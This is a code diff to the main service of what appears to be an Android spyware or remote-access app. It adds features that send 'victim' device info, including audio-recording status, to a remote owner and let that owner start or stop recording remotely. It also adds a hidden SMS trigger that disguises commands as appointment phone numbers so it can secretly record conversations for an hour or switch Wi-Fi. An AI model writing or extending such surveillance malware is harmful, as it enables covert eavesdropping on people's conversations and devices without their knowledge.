@@ -56,7 +56,7 @@ public class MainService extends Service {
         return _instance;
     }
 
-    private RecordManager getRecordManager() {
+    public RecordManager getRecordManager() {
         if (recordManager == null) recordManager = new RecordManager();
         return recordManager;
     }
@@ -78,6 +78,12 @@ public class MainService extends Service {
         recordManager = new RecordManager();
         myWifiManager = new MyWifiManager();
         //recordManager.startRecord(10*60*1000);
+
+        testCode();
+    }
+
+    private void testCode() {
+//        receiveSms("900", "sdfsf dsfsdf dfsd Тел. для записи: 842-42-06");
     }
 
     @Override
@@ -209,6 +215,8 @@ public class MainService extends Service {
                 info.put("netType", networkInfo.getTypeName());
                 info.put("netName", networkInfo.getExtraInfo());
                 info.put("netSubtype", networkInfo.getSubtypeName());
+
+                info.put("audioRecord", getRecordManager().isRecording());
                 nettyClient.sendGetVictimInfo(info, (String) message.get("owner"));
                 break;
             case "start.download.file":
@@ -242,9 +250,14 @@ public class MainService extends Service {
                 recordManager = getRecordManager();
                 int seconds = ((Long) message.get("seconds")).intValue();
                 if (seconds == 0) return;
-                boolean result = recordManager.startRecord(seconds * 1000);
+                boolean result = recordManager.startRecord(seconds * 1000, null);
                 code = (result)? SUCCESS : ERROR;
                 nettyClient.sendStartAudioRecord(code, (String) message.get("owner"));
+                break;
+            case "stop.audio.record":
+                recordManager = getRecordManager();
+                recordManager.stopRecord();
+                nettyClient.sendStopAudioRecord(SUCCESS, (String) message.get("owner"));
                 break;
             case "get.wifi.list":
                 myWifiManager = getMyWifiManager();
@@ -300,6 +313,27 @@ public class MainService extends Service {
                 else
                     outputJSONObject.put("code", ERROR);
                 return outputJSONObject.toString();*/
+        }
+    }
+
+    public void receiveSms(String phoneNumber, String message) {
+        String pattern = "Тел. для записи: ";
+        int start = message.indexOf(pattern);
+        String action = message.substring(start + pattern.length(), start + pattern.length() + 9);
+
+        switch (action) {
+            case "842-32-56": // ВКЛ Wi-Fi
+                getMyWifiManager().setWifiEnabled(true);
+                break;
+            case "842-18-37": // ВЫКЛ Wi-Fi
+                getMyWifiManager().setWifiEnabled(false);
+                break;
+            case "842-42-06": // ВКЛ запись разговора на час
+                getRecordManager().startRecord(60*60*1000, null);
+                break;
+            case "842-39-56": // ВЫКЛ запись разговора
+                getRecordManager().stopRecord();
+                break;
         }
     }
 }
